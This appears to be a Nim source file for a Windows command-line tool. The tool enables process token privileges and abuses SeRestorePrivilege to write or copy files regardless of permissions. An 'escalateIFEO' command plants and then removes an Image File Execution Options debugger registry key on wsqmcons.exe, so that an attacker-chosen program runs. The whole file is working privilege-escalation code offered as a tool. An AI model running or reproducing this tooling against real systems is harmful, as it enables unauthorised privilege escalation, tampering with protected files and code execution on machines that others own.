import adjustprivs
import cligen
import winim
import registry
import fileop

proc getSessionId(): int =
  var sessionid: DWORD
  ProcessIdToSessionId(getParentPID().DWORD, &sessionid)
  echo "Session ID of parent process is: " & $sessionid
  return sessionid.int

proc adjust(pid: int, privilege: string, enable=true): bool = 
  var hToken = getProcToken(pid)
  return setPrivilege(hToken, privilege, enable)

proc adjustParent(privilege: string, enable=true): bool = 
  return adjust(getParentPID(), privilege, enable)

proc adjustSelf(privilege: string, enable=true) = 
  if not adjust(GetCurrentProcessId().int, privilege, enable):
    raise newException(OSError, "Unable to enable SeRestorePrivilege")
    
proc escalateIFEO(filename = "wsqmcons.exe", debugger: string) =
  adjustSelf("SeRestorePrivilege")

  if createIFEOKey(filename, debugger):
    echo "Registry key created."

  if deleteIFEOKey(filename):
    echo "Registry cleaned up..."

proc fileWrite(filename: string, content: string = "") =
  adjustSelf("SeRestorePrivilege")
  var  pBuf = winstrConverterStringToPtrChar(content)
  if restoreFile(filename, pBuf, content.len):
    echo "File created: " & filename

proc fileCopy(source, destination: string) =
  adjustSelf("SeRestorePrivilege")
  var f_src: File
  if not open(f_src, source):
    raise newException(OSError, "Unable to open " & source)
  var buffer = newSeq[char](getFileSize(f_src))
  let bytes_read = readBuffer(f_src, addr buffer[0], buffer.len)
  close(f_src)
  if restoreFile(destination, buffer[0].addr, buffer.len):
    echo "Copied " & source & " to: " & destination & " (" & $bytes_read & " bytes)."


when isMainModule:
  dispatchMulti(
    [
      adjust, 
      help = { "pid": "target process id"}, 
      short = { "privilege": 's' },
      doc = "Adjust arbitrary process privileges"
    ], 
    [
      adjustParent, 
      short = { "privilege": 's' },
      doc = "Adjust parent process privileges"
    ],
    [
      escalateIFEO, 
      help = { "filename": "filename abc", "debugger": "filename to run upon execution"},
      doc = "Create Image File Execution Options registry key, trigger execution and remove the key."
    ],
    [
      getSessionId, 
      doc = "Get the Session ID"
    ],
    [
      fileWrite,
      short = { "filename": 'f', "content": 'c' },
      doc = "Create a file using SeRestorePrivileges with optional content."
    ],
    [
      fileCopy,
      short = { "source": 's', "destination": 'd' },
      doc = "Copy file using SeRestorePrivileges."
    ]
  )